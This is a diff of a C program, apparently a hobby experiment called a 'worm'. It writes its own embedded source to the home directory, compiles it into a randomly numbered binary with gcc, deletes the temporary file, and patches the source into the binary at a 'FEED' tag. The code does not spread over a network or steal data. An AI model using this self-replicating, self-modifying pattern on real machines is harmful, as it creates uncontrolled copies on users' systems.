@@ -33,18 +33,14 @@ int main(int argc, const char * argv[])
     "strcpy (dir, homeDir);\n"
     "strcat (dir, \"/tmp.c\");\n"
     "FILE *f = fopen(dir, \"w\"), *exec, *out;\n"
-    "static char a[100] = \"zbc\", buffer[10000], source[2000] = \"FEEDME\";\n"
-    "if( a[0] != 'a')\n"
-    "printf(\"hey mon this shouldn't happen\\n\");\n"
-    "else\n"
-    "    printf(\"%s\\n\",a);\n"
+    "static char a[100] = \"abc\", buffer[10000], source[2000] = \"FEEDME\";\n"
     "fprintf(f,\"%s\", source);\n"
     "fclose(f);\n"
     "srand(time(NULL));\n"
     "int r = rand() % 1000;\n"
     "char num[10];\n"
     "sprintf(num, \"%d\", r);\n"
-    "char *last = \" exec.c\";\n"
+    "char *last = \" tmp.c\";\n"
     "char str[80];\n"
     "strcpy (str, \"cd $HOME; gcc -o worm\");\n"
     "strcat(str, num);\n"
@@ -54,16 +50,17 @@ int main(int argc, const char * argv[])
     "system(\"cd $HOME; rm tmp.c\");\n"
     "char str2[80];\n"
     "strcpy (str2, \"/Users/eorndahl/worm\");\n"
+    "char *worm = \"/worm\";\n"
+    "strcpy (str2, homeDir);\n"
+    "strcat (str2, worm);\n"
     "strcat (str2, num);\n"
     "exec = fopen(str2, \"rb\");\n"
     "fread(buffer, sizeof(buffer), 1, exec);\n"
     "int i, k = 0;\n"
-    "char newCode[10000];\n"
-    "static char b[100] = \"dbc\";\n"
-    "static char c[100] = \"HEY MAN THIS SHOULDN'T HAPPEN!\\n\";\n"
+    "unsigned char newCode[10000];\n"
     "out = fopen(str2 , \"w\");\n"
     "for(i = 0;i < sizeof(buffer);++i, ++k) {\n"
-    "    if(buffer[i] == 'F' && buffer[i+1] == 'E' && buffer[i+2] == 'E') {\n"
+    "    if(buffer[i] == 'F' && buffer[i+1] == 'E' && buffer[i+2] == 'E' && buffer[i+3] == 'D') {\n"
     "        for(int j = 0; j < 2000; j++, i++) {\n"
     "            newCode[i] = source[j];\n"
     "        }\n"
@@ -78,12 +75,6 @@ int main(int argc, const char * argv[])
     "fclose(out);\n"
     "return 0;\n"
     "}\n";
-    
-    /*initial test*/
-    if( a[0] != 'a')
-        printf("hey mon this shouldn't happen\n");
-    else
-        printf("%s\n",a);
     
     /*print source code to a new file*/
     fprintf(f,"%s", source);
@@ -101,40 +92,26 @@ int main(int argc, const char * argv[])
 
     FILE *cmd=popen(str, "r"); //compile that file
     pclose(cmd);
-    system("cd $HOME; rm tmp.c"); //delete temporary source code file
+    system("cd $HOME; rm tmp.c");
 
 
-    char str2[80]; //concatenate homeDir with filename for path
+    char str2[80]; /*concatenate the new filepath for the exec*/
     char *worm = "/worm";
     strcpy (str2, homeDir);
     strcat (str2, worm);
     strcat (str2, num);
 
-    exec = fopen(str2, "rb"); //read exec in binary
-    fread(buffer, sizeof(buffer), 1, exec); 
+    exec = fopen(str2, "rb"); //read in binary
+    fread(buffer, sizeof(buffer), 1, exec);
     
     int i, k = 0;
-    char newCode[10000]; // second array for changed executable
-    static char b[100] = "dbc"; //characters to change
-    static char c[100] = "HEY MAN THIS SHOULDN'T HAPPEN!\n";
+    unsigned char newCode[10000]; //second array for changed executable
     out = fopen(str2 , "w"); //create new file for morphed binary
     
     for(i = 0;i < sizeof(buffer);++i, ++k) {
-        if(buffer[i] == 'a' && buffer[i+1] == 'b' && buffer[i+2] == 'c') { //swaps "abc" with "dbc"
-            for(int j = 0; j < 3; j++, i++) {
-                newCode[i] = b[j];
-            }
-            k = k + 3;
-        }
-        if(buffer[i] == 'h' && buffer[i+1] == 'e' && buffer[i+2] == 'y') {
-            for(int j = 0; j < 33; j++, i++) {
-                newCode[i] = c[j];
-            }
-            k = k + 33;
-        }
-        if(buffer[i] == 'F' && buffer[i+1] == 'E' && buffer[i+2] == 'E') { //source code input here
+        if(buffer[i] == 'F' && buffer[i+1] == 'E' && buffer[i+2] == 'E' && buffer[i+3] == 'D') {
             for(int j = 0; j < 2000; j++, i++) {
-                newCode[i] = source[j];
+                newCode[i] = source[j]; //source code input directly into executable here via FEED tag
             }
             k = k + 2000;
         }
@@ -150,4 +127,3 @@ int main(int argc, const char * argv[])
     
     return 0;
 }
-
